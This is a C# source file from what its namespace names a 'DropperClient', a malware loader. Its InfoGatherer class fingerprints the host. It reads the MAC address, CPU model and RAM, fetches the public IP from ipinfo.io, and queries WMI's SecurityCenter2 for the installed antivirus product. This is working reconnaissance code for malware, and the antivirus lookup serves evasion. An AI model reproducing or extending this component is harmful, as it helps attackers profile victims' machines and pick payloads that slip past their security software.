using System;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;

namespace DropperClient.SystemInfoGatherer
{
    internal class InfoGatherer
    {
        public string MacAddress { get; private set; }
        public string CPU { get; private set; }
        public string RamInfo { get; private set; }

        public string PublicIP { get; private set; }

        public string AV { get; private set; }

        public InfoGatherer()
        {
            MacAddress = GetMacAddress();
            CPU = GetCPUInformation();
            RamInfo = GetRAMInformation();
            PublicIP = GetPublicIp();
            AV = GetInstalledAv();
        }

        /// <summary>
        /// Attempts to get the MAC of the main network interface
        /// </summary>
        /// <returns></returns>
        private string GetMacAddress()
        {
            var macAddr = NetworkInterface.GetAllNetworkInterfaces()
                .Where(nic =>
                    nic.OperationalStatus == OperationalStatus.Up &&
                    nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                .Select(nic => nic.GetPhysicalAddress().ToString())
                .FirstOrDefault();
            return macAddr;
        }

        /// <summary>
        /// Attempts to get the full name of the CPU installed
        /// </summary>
        /// <returns></returns>
        private string GetCPUInformation()
        {
            var myProcessorObject = new ManagementObjectSearcher("select * from Win32_Processor");

            foreach (ManagementObject obj in myProcessorObject.Get())
            {
                return obj["Name"].ToString();
            }

            return null;
        }

        /// <summary>
        /// Attempts to get the amount of installed ram in gigabytes
        /// </summary>
        /// <returns></returns>
        private string GetRAMInformation()
        {
            var ramAmount = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
            var ramInGb = ramAmount / 1024 / 1000 / 1000;
            return ramInGb.ToString() + "GB";
        }

        /// <summary>
        /// Attempts to get the public IP of the running computer
        /// </summary>
        /// <returns></returns>
        private string GetPublicIp()
        {
            var externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
            return externalip;
        }

        /// <summary>
        /// Attempts to get the installed anti virus on the computer.
        /// </summary>
        /// <returns></returns>
        private string GetInstalledAv()
        {
            using (var searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2"
                                                                , "SELECT * FROM AntivirusProduct"))
            {
                var searcherInstance = searcher.Get();
                foreach (var instance in searcherInstance)
                {
                    return instance["displayName"].ToString();
                }
            }

            return null;
        }
    }
}